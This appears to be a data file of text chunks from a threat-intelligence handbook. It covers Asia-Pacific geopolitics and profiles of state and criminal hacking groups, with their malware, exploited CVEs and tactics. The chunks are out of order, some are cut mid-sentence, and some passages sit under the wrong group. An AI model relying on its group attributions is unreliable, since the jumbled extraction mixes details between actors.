A COMPLEX SINO-INDIAN RELATIONSHIP, SOURCE OF POLITICAL TENSIONS AND CYBER OPERATIONS China and India are states that share many similarities. Formerly under colonial rule, both countries have experienced exceptional economic and demographic growth that has allowed them to assert themselves as major powers at the regional and global levels. The two governments maintain close relations, particularly at the economic level, marked by bilateral partnerships and their leading role in the Shanghai Cooperation Organization (SCO). In spite of this collaboration, tensions remain between the two political regimes as they clash over their common frontier as well as over the trade routes developed in recent years. CONFLICT AROUND THE SINO-INDIAN BORDER ZONE June 15, 2020 is an important date in the evolution of the border conflict between the two countries. For the first time in 45 years, the frontier zone was the scene of violent clashes leading to the death

of Indian and Chinese soldiers in the mountainous Galwan River valley. This historic conflict is based on divergent views between the two regimes, with India considering the frontier region to be nearly 3500 km long, compared to an estimate repeated by the Chinese media of around 2000 km. While the likelihood of an open conflict between India and China remains low, the intensification of tensions related to the frontier regions could lead both sides to resort more frequently to the cyber tool. SILK ROAD AND FREEDOM ROAD: A SYMBOL OF SINO-INDIAN RIVALRY In 2013, Xi Jinping gave a speech in Astana in which he unveiled the comprehensive project to build infrastructure along the ancient Silk Roads. This project called «The New Silk Roads» shows the Chinese hegemonic ambition to create a new strategic paradigm along land and sea routes. In order to compete with this ambition, India and Japan have developed an infrastructure and transport project that is sup-

posed to revitalize the trade routes between the Asian and African continents: the «Freedom Road». The rivalry between both projects tends to intensify tensions between Beijing and New Delhi. The port of Gwadar, a symbol of the «New Silk Roads», has to face competition from the port of Chabahar, inaugurated in 2017 by an Indo-Iranian alliance wishing to challenge the grip of Chinese influence in Central Asia."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|0bda271f2c5c454088cca4ff2ee3385a
"South Asia is a geographic region that tends to move towards closer unity despite the dissensions and diversities. It is physically permeated by contradictory geopolitical issues, culturally shaped by beliefs, which are hard to reconcile, and historically marked by a heritage of conflict. Tensions between India and Pakistan, the instability of Afghanistan and the great difference in development and wealth between the countries make

regional integration unlikely. This is reflected in the many cyberattacks between groups in these countries. However, the states in question are trying to overcome the difficulties through development projects, bilateral and multilateral cooperation and the creation of a free trade area. These challenging attempts are motivated by an awareness of a broader contextual dimension. Regional integration, albeit imperfect, should help the

countries in the region protect from neighbouring influences and gain significance on the international stage in an autonomous manner. As we have seen, cyberattacks from neighbouring countries occur regularly and often focus on destabilisation and espionage by exploiting these historic, cultural and physical animosities."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|5e5f503787b0473585ce81f5fcfde3c0
"THE RISE IN SINO-INDIAN TENSIONS HAS LED TO A SHARP INCREASE IN CYBER ESPIONAGE ACTIVITIES BY CHINESE-BASED ATTACKER GROUPS ON INDIAN TERRITORY The energy sector has been particularly affected, as have port facilities. TTPs analysis seems to correlate these actions to the activity of Chinese attacker groups, including APT41, Tonto Team or even RedEcho. In 2013, India announced its desire to compete with the «New Silk Roads.» That same year, a group known as Wet Panda, operating since 2010

Contextual analysis of Oceania and geocyber risks Oceania extends over a vast area of the Pacific Ocean, and encompasses different sub-regions made up of island states and island groups, including Melanesia (the Solomon Islands, Fiji and Vanuatu), Micronesia (Mariana Islands, Marshall Islands, Caroline Islands, Nauru and Guam), and the islands of Polynesia (Hawaii and Easter Island). It also includes New Zealand and Australia, larger countries which are more economically developed than the island states. The region’s dynamics play out at Pacific-wide, sub-regional, and island levels. While Austra-

_AUSTRALIA AND NEW ZEALAND EXPERIENCE INCREASING TENSION IN RELATIONS WITH CHINA _TENSIONS BETWEEN CHINA AND AUSTRALIA Australia and China have adopted a more confrontational approach to each other. In 2018, bilateral relations between Australia and China appeared to be at their lowest ebb for a decade when Australia ruled out Chinese telecom giant Huawei from building its 5G network on national security grounds. Over the year 2020, however, the relationship between the two countries has deteriorated even further, at a critical time for the region. The ongoing degradation of relations between Canberra and Beijing throughout 2020 had unprecedented consequences for trade 64"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|8d43d386072e4b748571ad04b76db4c7
"lia and New Zealand stand out as key countries thanks to their demographic and economic importance, the island states of Oceania are still over-dependent on other countries, leading to the development of a “north-south” divide in the region. Largely ignored in the history of international relations, Oceania has emerged as a zone of significant strategic interest in the post-war period. Australia and New Zealand are seeking extensive US engagement in Oceania, while affirming their position as regional powers.

and economic links. On April 19, 2020, Scott Morrison’s government upped the stakes even further with its proposal for a global inquiry into China’s handling of the Covid-19 epidemic in Wuhan, thereby suggesting that China might be responsible for the global pandemic, and leading to an immediate response from the Chinese government. Australia and China subsequently became embroiled in an escalation of trade disputes. Starting in May 2020, for example, China introduced a series of commercial sanctions against Australian products. The sanctions resulted in higher tariffs and stricter quotas being imposed on Australian products such as wine or barley. In parallel with these commercial tensions, diplomatic disputes between the two countries also intensified. In May 2020, the Morrison government used its veto power to cancel Chinese investments that were to expand the"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|2527116b94024d81a349c4ca353b04ec
"The decolonisation process has also focused attention on the challenges and vulnerabilities of small states in the region. The economic and political emergence of Asian powers has driven the development of closer links with Asia, and a stronger sense of belonging to the Asia-Pacific region. While retaining ties with the UK and with their European heritage, Australia and New Zealand are also turning to the United States as a key security ally, evidenced notably in the AUKUS alliance in 2021, associated with the nuclear submarines scandal.

In July 2020, Canberra promise to offer a safe haven to residents of Hong Kong after China rolled out its national security law to the city. The Chinese embassy in Australia responded by accusing Canberra of political interference in China’s internal affairs. In November 2020, Chinese Foreign Ministry spokesperson Zhao Lijian tweeted – via his official Twitter account – a controversial fake image depicting an Australian soldier holding a bloodied knife over the throat of an Afghan child. Canberra requested that China apologise for this attack on the conduct of Australian soldiers in Afghanistan, but received no reply. This series of diplomatic incidents between the two countries must be viewed within the context of Australia’s broader security concerns about Chinese growth presenting a threat to the Asia-Pacific region. In response to the issue, Australia has"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|2972d5a1dcbf4de5b5840621c3477c44
consolidated its collaboration with allies and regional partners, such as the United States, the United Kingdom, Canada, New Zealand, Japan and India. _ESCALATING ECONOMIC AND DIPLOMATIC TENSIONS IN 2020 BETWEEN CHINA AND AUSTRALIA HAVE ENCOURAGED OFFENSIVES BY CHINESE ATTACK GROUPS AGAINST AUSTRALIAN TARGETS, NOTABLY NATIONAL UTILITIES AND HOSPITALS In June 2020, the Australian government issued an advisory on increased cyber activity by a state actor against networks belonging to its agencies and companies in the country. According to the Australian’s government, the attack was operated by a state-sponsored actor that relied on an exploit code which had been slightly modified for past vulnerabilities. Unofficially, China was bla-|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|489abe2beae743358d0763c17c3a48e0
med. The actor targeted public-facing infrastructure through the use of remote code execution vulnerabilities. This was the fourth warning in a year from the Australian Cyber Security Centre (ACSC) about threat actors exploiting critical vulnerabilities in Telerik UI (CVE-2019-18935, CVE-2017-9248, CVE-2017-11317, CVE-2017-11357). Exploit code had been publicly available for a while. If they failed to gain initial access by leveraging these flaws, the attacker turned to spear phishing to harvest credentials, deliver malware, and steal Office 365 OAuth tokens. A link to China is provided by the threat actor’s use of malware – such as PlugX – that has been associated with Chinese hacker groups, some believed to work on behalf of the government. Several actors, all connected to China and engaged in espionage activities, have PlugX in their toolset (ATK2, ATK37, ATK220, ATK41, and ATK15).|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|3261c904562b46c989967b0ad38460ea
"_NEW ZEALAND’S POSITION IN THE OCEANIA REGION The intensification of tensions between China and Australia raises questions about New Zealand’s strategic positioning in this new context. On the one hand, the country is a historical ally of Australia and the trans-Tasman relationship was built around a common British colonial heritage. The two countries are part of the Commonwealth of Nations, the Five Eyes for strategic intelligence sharing, and have developed economic collaboration around the Closer Economic Relations (CER) free trade agreement. On the other hand, China accounts for nearly 30% of Australia’s exports and maintaining a peaceful bilateral relationship is critical to the sale of Australian dairy products overseas. In May 2020, the Five Eyes alliance (Canada, the United States, the United Kingdom, Australia and New Zealand) decided to broaden its preCyber Threat Handbook | 65"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|0c1103ff60884c389e5a0c4611275b7e
"Geographical zones rogatives to allow for the display of a unique posture on issues related to democracy and fundamental human rights. In November 2020, this new role took shape when the alliance condemned China’s intervention in Hong Kong and called for the reinstatement of the members of the Legislative Council who had been suspended by Beijing. This declaration also denounced the treatment of the Uighur population. While New Zealand Prime Minister Jacinda Ardern spoke of the difficulty of «reconciling» differences between the two countries, Foreign Minister Nanaia Mahuta refused to join the Five Eyes alliance’s condemnation of the treatment of the Uighur minority in Xinjiang province. This statement, in addition to jeopardizing the alliance’s political project, shows the fragility of New Zealand’s diplomatic position, torn between preserving its relationship with Australia and its economic

well-being. The progressive militarization in the South China Sea and Chinese interference in Hong Kong could lead New Zealand to adopt a clearer strategic line in the future. Depending on the positioning chosen, New Zealand could become a breeding ground for offensive activity by Chinese cyber attackers."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|86c66af66e9b4158a2bc0b884642cb8c
_AUSTRALIA AND THE NEW AUKUS ALLIANCE IN THE INDO-PACIFIC REGION AUKUS (an acronym based on the country names Australia, United Kingdom and United States) is a new trilateral strategic defence alliance. It was initially created for the purpose of constructing a class of nuclear-powered submarines, collaborating in the Indo-Pacific region (where the rise of China is viewed as a growing threat), and developing more advanced tech-|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|53875c101f5c498fb970473b43a79f7a
"nologies. The agreement led Australia to terminate the contract awarded to France in 2016 for the construction of 12 diesel-electric submarines to replace its ageing fleet of Collins-class submarines. Australia decided in November 2021 to engage alongside its American and British allies. Aside from the United Kingdom, this is the first time that the United States has shared nuclear propulsion technology with an ally. Consequently, many observers believe that Australia, the United Kingdom and the United States have entered into a historic nuclear defence and security agreement which will have consequences in the Indo-Pacific region for decades to come. The agreement will enable Australia to build a fleet of at least eight nuclear attack submarines in order to counter Chinese influence. However, it is also interesting to note that the AUKUS agreement will include artificial intelligence as well as other technologies, such as cybersecurity. AUKUS could therefore be one of the most important defence and cooperation alliances for decades. According to the associated press release, the partnership is a historic opportunity for the three nations to protect their shared values, and contribute to the stability and prosperity of the Indo-Pacific region, together with friends and partners who share the same ideas. The decision to involve Australia in the longstanding cooperation between the US and the UK reflects the West’s growing concern about

Beijing’s military expansion, debt diplomacy and cyber-intimidation. _THE AUKUS ALLIANCE GOES WELL BEYOND JUST SUBMARINES Attention has focused on French and Australian diesel/nuclear submarines, and military hardware is certainly a key component, in view of the geopolitical issues at stake. However, the agreement also covers other forms of conflict. The AUKUS alliance attaches particular importance to cyberspace. At the press conference announcing the agreement, US president Joe Biden said that a cybersecurity component would be included, in

addition to submarine technology. Although President Biden did not specify this during the press conference, it appears probable that the United States and the UK would support Australia in the deployment of cyber-defence, and potentially also cyber-attack, capabilities. In recent years, Australia has been the target of several major cyber-attacks, one of the most striking of which took place in June 2020. Australian Prime Minister Scott Morrison went on the record to officially state that the country had been the subject of a sophisticated state-sponsored cyber-attack. Suspecting that China was responsible, Mr Morrison said that he had talked to British Prime Minister Boris Johnson about the incident, although it is uncertain whether the United Kingdom had provided cyber-expertise to Australia.

ATK1 aka - The group focuses mainly on the territories bordering its country of origin (South China Sea); The group primarily targets government institutions and political parties; Educational establishments such as universities, as well as companies in the telecommunications sector are not spared. They notably used the Elise malware, it was intended to spy on many government organizations, mainly in Southeast Asia. We can think that this campaign was intended to support the Silk Roads project by securing the maritime side of the latter. At the end of 2015, its “Emissary” malware received numerous updates, probably to avoid being detected by security products. After a very active period, the group remained discreet until the beginning of 2017. Other campaigns were carried out sporadically until 2018, still using Elise as the main attack vector, and sometimes using new exploits, such as CVE-2017-11882. ATK1 is capable of performing very large operations over a long period of time, while developing its specific arsenal. These targets are extremely precise and the group rarely deviates from them. Examination of the group targets reveals that they correspond to the preferred geographic areas followed by offices 2 and 6 (units 61398 and 61726), which are the United States / Canada and South Asia / Taiwan areas, respectively.

ATK103 - (aka: TA505). It is a significant part of the email threat landscape and is responsible for the largest malicious spam campaigns Proofpoint have ever observed, distributing instances of the Dridex banking trojan, Locky ransomware, Jaff ransomware, the Trick banking trojan, and several others in very high volumes. ATK103 use Necurs botnet to drive massive spam campaigns. ATK103 seems to be motivated by financial gains. It is hightly adaptable, often changes its malwares and techniques, uses off-the-shelf malwares and operates on a massive scale. It doesn’t seem to be trying to stay stealthy. Since March 2018, ATK103 was observed using FlawedAmmyy RAT, a variant of the leaked AmmyyAdmin 3 (Remote Administration Tool). The use of these tools can make us think that this actor wants to switch from big spam campaigns to more targeted attacks. In July 2018, ATK103 has been seen using the SettingContent-ms files in their decoy documents. This technique has been described by Matt N. and in early June 2018, MSRC responded with a note that the severity of the issue is below the bar for servicing and that the case will be closed. Some of these malwares were signed with a COMODO SECURE certificate. ATK103 seems to be a Russian speaking group."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|672e4e749b104fc2a40e358202bef4c9
"ATK103 (TA505) AS KEY PLAYER IN THE CYBERCRIME ECOSYSTEM - As mentioned in ATK104’s description, ATK103 has a more or less tenuous relationship with ATK104, as shown by the identical nature of certain functions developed in the Emotet and Trickbot download software (which is an adaptation of the original TrickBot malware created by ATK82 (Wizard Spider).

However, this relationship is not limited to ATK104. We know that the ATK86 group (Silence group), which specializes in targeting large banks and their ATMs, and the ATK88 group (FIN6), which specializes in attacking points of sale and stealing credit card data, have already used the FlawdAmmyy remote administration tool developed by ATK103 (TA505).

_DESCRIPTION

Targeted Areas_

ATK104 - First observed in mid2014, this malware shared code with the Bugat (aka Feodo) banking Trojan. However, Mummy Spider swiftly developed the malware capabilities to include an RSA key exchange for command and control communication and a modular architecture. Mummy Spider does not follow typical criminal behavioral patterns. In particular, Mummy Spider usually conducts attacks for a few months before ceasing operations for a period of between three and 12 months, before returning with a new variant or version. After a 10 month hiatus, Mummy Spider returned Emotet to operation in December 2016 but the latest variant is not deploying a banking Trojan module with web injects, it is currently acting as a loader delivering other malware packages. The primary modules perform reconnaissance on victim machines, drop freeware tools for credential collection from web browsers and mail clients and a spam plugin for self-propagation. The malware is also issuing commands to download and execute other malware families such as the banking Trojans Dridex and Qakbot. Mummy Spider advertised Emotet on underground forums until 2015, at which time it became private. Therefore, it is highly likely that Emotet is operated solely for use by Mummy Spider or with a small trusted group of customers. The group is composed of competent personnel, and Emotet is regularly considered as one of the most threatening malware for businesses."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|02776dd6d3944845be4877f1adde0c58

The group seems to have an interesting interaction with the ATK103 (TA505). TA505 is a financially motivated group that is active since 2014, seemingly of Russian origin. It is a significant part of the email threat landscape and is responsible of large malicious spam campaigns, mostly to distribute the Dridex and Trickbot banking trojan, the Locky and Jaff ransomwares, among others. TA505 use Necurs botnet to drive these campaigns. It is highly adaptable, often change its malwares and techniques, regularly use offthe-shelf malwares and operate on a massive scale. Since March 2018, ATK103 was observed using FlawedAmmyy RAT, a variant of the leaked AmmyyAdmin 3 (Remote Administration Tool). The use of these tools can make us think that this actor is willing to switch from big spam campaigns to more targeted attacks. First, TrickBot is probably the most distributed malware by Emotet, and has been distributed nearly every day since September 2018. The links were rather tenuous however, and TrickBot was just another malware dropped by Emotet until September 2019. In the beginning of June 2019, the group took a break until September 16, 2019. The group, as previously mentioned, came back with a new infrastructure zone (Epoch 3). Since this day, every time that a TrickBot malware is deployed via Emotet (currently, nearly every day) its tag (an identifier that is added to every build of TrickBot) follows a specific pattern, while previous distribution tags were seemingly random.|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|a322db69be9041389023858d05c49b35
"This hints to a bigger cooperation between the ATK103 group and Emotet. Moreover, on September 18, 2019 the group introduced a new loader. This loader, that is bigger, shares some code with the TrickBot loader. This might mean that the group

used the summer break they took to strengthen their relationships with ATK103. Indeed, deploying the group malware in a privileged way is one thing, but potentially sharing code is another. On 27 January 2021 Europol announced that the infrastructure of the Emotet network had been neutralised through a multilateral police operation.

_DESCRIPTION

espionage group active since at least 2010. One of its specificity is

ATK11 - It started by the Operation Hangover which goal seemed to be the surveillance of targets of national security interests for India such as Pakistan or the Nagaland movement. This group was involved in the Monsoon campaign targeting multiple Indian neighbours in various sectors. Patchwork used actuality/sector related themes in lure documents exploiting known vulnerabilities in Microsoft Office software send via email with links to websites customized for the intended target. The group is continuously adding new exploit in their arsenal. Patchwork uses different web services as C2 channel like RSS feeds, Github, forums, blogs or dynamic DNS hosts. These channels can be difficult to detect in legitimate traffic. Some RTF files used by this group were linked with C2 servers which were compromised and defanced by Cyber Gangsters which is an anti-Pakistan group. By following the alias Fortinet managed to get his identity in their article of April 2017. Nevertheless, Fortinet says if it is really linked to the Badnews malware or if it is a coincidence. Multiple articles showed similarities between Patchwork behaviors and other Confucius, Bahamut, Donot Team or Bitter Apt, but there is no definitive conclusion as to whether these groups are the same or not."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|9ffa4a3a27b8470bba072561542173a1

Hackers mainly used waterhole attacks as infection vector, the experts discovered several news websites that have been compromised to redirect visitors to a downloading site that delivered the final malware. The group deploys its tools through multiple main vectors: Telegram channels and watering holes. Indeed, it regularly uses compromised websites in order to gain access its targets. The group also started using an exclusive Windows malware, nicknamed “SpecialSaber”.

Group

This group used a large CnC network of infected machines and dozens of domain names working as a chain of proxies to hide the attacker’s location. Cloud Atlas is able to target mobile devices, network equipment and removable disk drives increasing the quantity of sensitive data accessible. They use multiples exploits but not 0-days which can be interpreted as a lack of ressources. Cloud Atlas created the Inception framework. A sophisticated framework able to launch multiple modules allowing the group to adapt to its target. This framework is still used in 2019. After the Kaspersky disclosure in 2013, the group hid and then reappeared in 2014 with the Cloud Atlas malware. This behaviour will be repeated thereafter in 2014 after the publication of Symantec. The group improved its C2 infrastructure in 2014 by using cloud services which have the advantage of not being blacklisted and use encrypted communication protocols. They can also use compromised router as proxies to hide their origin. According to DomainTools the ATK116 group (Inception, Cloud Atlas) was active in October-November 2020 in the conflict between Azerbaijan and Armenia in

_DESCRIPTION

Threat Actor_

ATK117 - This North Korean state-sponsored cyberthreat actor has similar prerogatives to those of Unit 180 of the North Korean Army’s General Reconnaissance Bureau. The Unit 180 is the North Korean Unit in charge of obtaining funds for the cyber activity and for the Noth Korean regime. This activity exists since at least 2014 and seems to have been increasing since North Korea has been subject to severe financial sanctions due to the development of new weapons. The economic pressure on Pyongyang leads the North Korean government to find new ways to obtain funding.

APT38 is a North Korean financially motivated threat group who developed multiple ways to steal money from the targeted attacks on banks and cryptocurrency exchanges to the spreading of ransomwares. This group seems to be learning about financial transaction in 2014 and developed a SWIFT malware in 2015. From 2014 to 2017 they mostly targeted organizations from Southeast Asia and expand to South America and Africa in mid-2016. They also targeted Europe and North America from October 2016 to October 2017. APT38 has a complete arsenal of malwares and tools using defense evasion techniques and false flags (use of some poorly translated Russian language in some malwares, re-useage of known malwares). It is possible that these malwares were developed by another Unit (such as Unit 31), these techniques could be used by other North Korean groups. Despite this arsenal, APT38 uses Live-of-the-Land tools when it is possible. They put an effort into discovert the targeted environment and maintain access as long as possible while staying undetected unitil they reach their

goal. FireEye estimates that they stay in a victim network approximately 155 days. Since 2018 the group has gone from stealthy to noisy using the destructive KillDisk malware as a distraction tactic while they are targeting the SWIFT network to initiate malicious transactions. We suspect the Unit 180 to be source of the WannaCry ransomware in 2017. The report from the UN Security Council said that North Korea is carrying out “widespread and increasingly sophisticated” cyberattacks and estimates that North Korea has generated $2 billon.

_DESCRIPTION

Targeted Areas_

ATK120 - LYCEUM may have been active as early as April 2018. Domain registrations suggest that a campaign in mid 2018 focused on South African targets has been conducted by ATK120. In May 2019, the threat group launched a campaign against oil and gas organizations in the Middle East. This campaign followed a sharp uptick in development and testing of their toolkit against a public multi-vendor malware scanning service in February 2019. Its target core is very similar to that of the APT Xenotime (ATK91), and some similarities can be found with Magnallium and Chrysene. No definitive links can be established.

ATK120 (aka: Lyceum, Hexane) This threat group targets organizations in sectors of strategic national importance, including oil and gas and possibly telecommunications.

"_Dominance

_Coercion

ATK128 is mostly known for taking over Twitter accounts of high ranked personnel such as CEOs of large cooperations and more, and Twitter accounts of organizations themselves. In most cases they claimed that they took over the account to show its owner its low level of security, while requesting them to contact the group directly to solve this problem. This shows that the group presents itself as a kind of a grey-hat group who looks for vulnerabilities and security issues in order to receive money from the companies in which these issues were found. This was also the case with the two DDoS attacks they launched against HSBC bank and Pokemon Go (in 2016 and 2017 respectively), allegedly to enhance the level of security of those companies. However, even though OurMine tried to show themselves as a group that enhances cyber security of companies, some of their attacks were done as a revenge. For example, they took over a media website after publishing an article that allegedly revealed the real identity of the threat actor behind the group, a teen from Saudi Arabia. Another example was when they leaked information of a company that did not contact them about security issues they found in its servers. Furthermore, in some cases they tried to brag about their capabilities when they were challenged to hack the website of WikiLeaks in 2017. Overall, the group did not launch very sophisticated attacks, and all the attacks were detected very quickly."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|7f56d489feda42d29f2feacf46b86f4b
"Of note, since mid 2017, the group is not active, and their website seems to be under maintenance.

On January 22, 2020, the group started to target social medias account (Twitter, Facebook, Instagram) which combined have tens of millions of followers. they published the message “Hi, we’re OurMine group. We are here for 2 things: 1) Announce that we are back 2) Show people that everything is hackable. To improve your accounts security contact us: contact@ourmine.org”.

_DESCRIPTION ATK13 is a Russian-speaking group widely believed to be a Russian state-sponsored organization.

ATK13 (aka: Turla, Uroburos, Waterbug, Venomous Bear) is a cyber espionage threat actor active since"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|8dc303c7f1ab4c5a80aed779902d5976
"ATK13 (aka: Turla, Uroburos, Waterbug, Venomous Bear) is a cyber espionage threat actor active since

In 2015, Kaspersky described ATK13 as one of the “several elite APT groups that have been using — and abusing — satellite links to manage their operations — most often, their Command & Control (C&C) infrastructure”. Indeed, while APT C&C servers are regularly taken down by authorities, satellite connections hides the exact location of the servers. Satellite-based Internet receivers can be located anywhere within the area covered by a satellite, and this is generally quite large. To do that, the attacker needs to pay an expensive connections (full duplex satellite links can be very expensive: a simple duplex 1Mbit up/down satellite link may cost up to $7000 per week) or hijack the network traffic between the victim and the satellite operator that requires either exploitation of the satellite provider itself, or of another ISP on the way. The oldest sample found by Kaspersky that used a satellite connections has been compiled in November 2007.

Turla’s attack on one of Iran’s most successful groups combines opportunism and international interests. It should be recalled that since 2014 and the annexation of the Crimea, Western pressures and the fall of the oil price have plunged Russia into recession. For this reason, Russia has moved closer to Saudi Arabia, whose alliance with the United States had weakened under the Obama era in the alder of the Iranian nuclear agreement,

supported by the former US President. It seems that the change in American diplomatic line since the election of Donald Trump has not diverted Saudi Arabia from this alliance. This rapprochement of interests is denounced by Iran, most recently at the OPEC meeting in Vienna in July 2019. The reason for the tension is also economic as both countries are positioning themselves to address the European gas market.

ATK132 - (aka: Syrian Electronic Army) is a hacking group active since the beginning of the Syrian Civil War in 2011. The group supports the current regime of Bashar Al-Assad, and according to several reports, it is actually part of it. In the hight of the civil war, the group launched many cyber-attacks, usually against online platforms of media outlets, in order to deface them and spread their pro-Syrian regime agenda. The attacks and defacements were not just against the official websites of the media outlets, but also against their social media accounts and even their registrar. In addition, the group is known to use different types of malware, usually against groups and individuals that oppose Al-Assad’s regime. These malware are of various types and usually have advanced capabilities. In addtion, they usually used spear-phishing as their attack vector, but also other techniques such as watering holes. All of this indicates on the high professional level of its members and their capabilities. Their attacks were occasionally launched by affiliated groups and hackers of the SEA, such as Syrian Malware team, who share infrastructure and personnel with the SEA. Of note, in recent years, cyber-attacks affiliated with the group have become more and more rare. In October 2021, Facebook’s threat disruption team took action against hackers in Pakistan and Syria. They specifically removed 3 Syrian hackers networks from the platform, namely the SEA (APT-C-27, aka."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|641d54a261ef4f6095041f12bb0f95ea
"ATK132), APT-C-37 (aka. ATK85) and a government-backed group that targeted minority groups, activists, opposition, Kurdish journalists, activists, members of the People’s Protection Units (YPG), Syria Civil Defense and the White Helmets. Note: SEA’s activity was linked by Facebook to Syria’s Air Force Intelligence in their latest campaign.

_ATTACKS HAPPENED ON

ORIGINS OF THE GROUP The malware BlackEnergy is a malware, allegedly created in 20062007. This malware was used to launch DDoS attacks against machines. It was used against Georgia and Estonia in large campaigns, taking down governmental and banking websites. The attacker reportedly sold the source code for $700. Several actors did use this malware, continuing DDoS attacks against Georgia. Around 2014, a group created SCADA and ICS plugins for BlackEnergy, in order to target manufacturing and the energy sector worldwide. This is the group named ATK14.

_DESCRIPTION

Threat Actor_

Targeted Areas_

ATK15 - The group has a preference for leveraging strategic web compromise (SWC) and scan-and-exploit techniques to compromise target systems. The cyber-spies also used proprietary remote access tools in attacks observed since 2016, including SysUpdate and HyperBro. A multi-stage malware, SysUpdate is used exclusively by the group, being delivered via multiple methods, including malicious Word documents leveraging Dynamic Data Exchange (DDE), manual deployment via stolen credentials, or via a redirect from a strategic web compromise (SWC). Access to government resources are abused to conduct their campaign attacks. The tools HyperBro and shikata_ga_nai compressor have been used in their recent campaigns. This group is known for their strategic web compromises, relying on whitelist to deliver payloads. The group also has tendency to compromise Microsoft exchange servers.

ATK15 (Aka Emissary Panda) is a cyber espionage group active since at least 2009 (first spearphishing spotted by TrendMicro on November 25, 2009), likely based in the Republic of China.

ATK168 - The group behind the GandCrab ransomware was selling access for use in a program partnership with a limited number of accounts. In May 2019, the group announced their retirement, which coincided with the first appearance of Revil / Sodinokibi in April of the same year.

GandCrab

Sodinokibi

Revil is a Ransomware as a service ; (RaaS). In 2020, it is the ransomware most often involved in attacks. These not only consist of encrypting the data that the victim can only recover for a ransom, but in addition, the cybercriminals blackmail the distribution of this data.

The main infection vector is a phishing email that invites you to download a compressed file, but other techniques have been used (such as in June 2021 a software vulnerability of the company Kaseya). Several elements indicate a Russian origin of this malware: the program is instructed to suspend its activity if it detects that the system language is Russian, and it is for sale on Russian-speaking forums. On 13 July 2021, REvil websites and other infrastructure vanished from the internet. This group has been the source of tensions between the newly elected US President Joe Biden and Vladimir Putin, following the numerous attacks suffered by the US from Russia. Following the closure of the group’s infrastructure, senior officials do not rule out the possibility that the Russian government put pressure on the group.

ATK17 - This group is known for the diversity of the lures that it uses in order to target its victims. ATK17 is targeting foreign corporations with a vested interest in Vietnam manufacturing, consumer products, and hospitality sectors. Furthermore, there are indications that ATK17 actors are targeting peripheral network security and technology infrastructure corporations. Furthermore to focused targeting of the private sector with ties to Vietnam, ATK17 has also targeted foreign governments, as well as Vietnamese dissidents and journalists since at least 2013. For instance, in 2017, social engineering content in lures used by the actor provided evidence that they were likely used to target members of the Vietnam diaspora in Australia as well as government employees in the Philippines.

Attackers group

_DESCRIPTION

Threat Actor_

ATK2 - They have the capability to attack many organizations with concurrently running campaigns. They operate efficiently and move quickly and methodically. Based on these factors, the group would need to be a sizeable organization made up of between 50 and 100 individuals.

Targeted Areas_

ATK2 (aka: Aurora Panda) group has been in operation since at least 2009 and is most likely a professional organization that offers a “hackers for hire” service.

The members of this group are experts at breaching systems. They engage in a two-pronged strategy of mass exploitation and pay-to-order targeted attacks for intellectual property using two Trojans designed specifically for each purpose:

Much of the attack infrastructure and tools used during these campaigns originate from network infrastructure in China. The ATK2 group makes regular use of zero-day exploits and has the ability to rework and customize exploits quickly. They are methodical in their approach and they display a skillset far in advance of some other attack groups also operating in that region, such as the Comment Crew (also known as APT1). The ATK2 group is an advanced persistent threat that has been in operation for at least four years and is brea-

_Team Moudoor distributes Backdoor. Moudoor, a customized version of “Gh0st RAT”, for largescale campaigns across several industries. The distribution of Moudoor requires a sizeable number of people to both breach targets and retrieve the information from the compromised networks. _Team Naid distributes Trojan. Naid, the Trojan found during the Bit9 incident, which appears to be reserved for more limited attacks against high value targets. This Trojan was leveraged for a special operation during the VOHO campaign and is probably used by a specific team of highly skilled attackers within the group. This Trojan was also found as part of “Operation Aurora” in 2009.

king into some of the best-protected organizations in the world. With a zero-day attack already under their belt in 2013, they continue to operate at the leading edge of targeted attacks. Between January and March 2020, APT41 launched a large scan attempting to exploit vulnerabilities in Citrix NetScaler/ADC, Cisco routers, and Zoho ManageEngine Desktop Central on a large number of companies in many sectors and countries. During these exploitation attempt, APT41 only used publicly available malware such as Cobalt Strike and Meterpreter. These tools were propably used as reconnaissance step before useing more advanced custom malwares. This campaign shows that the group is ressourceful and can quickly leverage newly disclosed vulnerabilities.

ATK23 - This group is described as a group having a relative lack of complexity but they sucessfully compromised their targets which are mostly the defence contractors, industrial campanies, shipbuilding companies, telecommunication operators and medias in Japan, Taiwan and South Korea. This group used spearphishing emails exploiting CVE-2012-0158 and CVE2012-1856 or contains a web link to Oracle Java exploits CVE-20130422 and CVE-2012-1723. It uses already known and patched vulnerabilities. Its lure Word documents contains pictures of a woman or are related to political actuality. This group also used HLP files abusing Windows features to drop its malwares. After the initial access, the group list folder on the disk, IP configuration and information about the victim network. If the victim is interesting it deploys additional softwares such as backdoor and lateral movement tools to dump password from Windows, IE or Outlook and a legitimage RAR compressing tool. It also try tool steal Windows address books (.WAB files) and XSL, DOC or HWP documents. The stolen document are compressed and split into multiple parts using WinRAR or CABARC to be transfered to the C2 server. The lateral movement is done using multiple tools to dump credential from browsers or Outlook. The C2 servers are hosted on shared hosting plateforms and dedicated hosting. Their C2 infrastructure is very ephemeral. Icefog seems to use a hit and run strategy."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|e79662bee4e04e6c982e8b361fe3da07
